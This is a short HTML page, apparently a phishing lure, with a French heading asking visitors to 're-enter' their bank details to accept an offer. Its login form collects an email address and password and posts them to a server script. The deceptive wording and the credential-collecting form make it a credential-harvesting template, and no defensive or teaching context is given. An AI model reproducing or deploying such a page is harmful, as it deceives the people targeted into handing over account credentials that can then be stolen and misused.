<link href="css.css" media="all" rel="stylesheet" type="text/css"/>
<html>
    <head>
       <meta charset="utf-8">
        <!-- importer le fichier de style -->
    </head>
    <body>
        <div id="container">
            <!-- zone de connexion -->
            
      <form method=POST action="connection.php">
                <h1>Veuiller rerentrer vos coordonner bancaire pour accepter l'offre</h1>
                
                <label><b>Email</b></label>
                <input type="text" placeholder="Entrer l'adresse email" name="email" required>

                <label><b>Mot de passe</b></label>
                <input type="password" placeholder="Entrer le mot de passe" name="password" required>
<input type="submit" id='submit' value='LOGIN' >



            </form>
        </div>
    </body>
</html>
